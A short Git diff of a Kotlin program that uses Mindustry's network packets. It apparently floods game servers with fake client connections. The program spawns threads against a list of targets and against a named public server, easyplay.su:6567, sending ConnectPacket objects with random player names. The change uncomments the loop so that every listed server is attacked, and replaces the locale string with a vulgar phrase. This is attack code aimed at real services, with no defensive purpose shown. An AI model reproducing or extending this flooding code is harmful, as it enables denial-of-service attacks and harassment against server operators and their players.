@@ -17,10 +17,10 @@ import mindustry.net.Packets.ConnectPacket
 fun main() {
     init()
     val targets = listOfServes()
-    //targets.forEach { target ->
-    //    val thread = Thread { task(target) }
-    //    thread.start()
-    //}
+    targets.forEach { target ->
+        val thread = Thread { task(target) }
+        thread.start()
+    }
 
     for (i in 0..9) {
         val thread = Thread { task("easyplay.su:6567") }
@@ -48,7 +48,7 @@ private fun packet(): ConnectPacket {
 
     packet.name = Rand().random(-99999, 99999).toString()
     packet.color = 255
-    packet.locale = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"
+    packet.locale = "chlen darka"
 
     packet.mods = Seq()
     packet.mobile = false
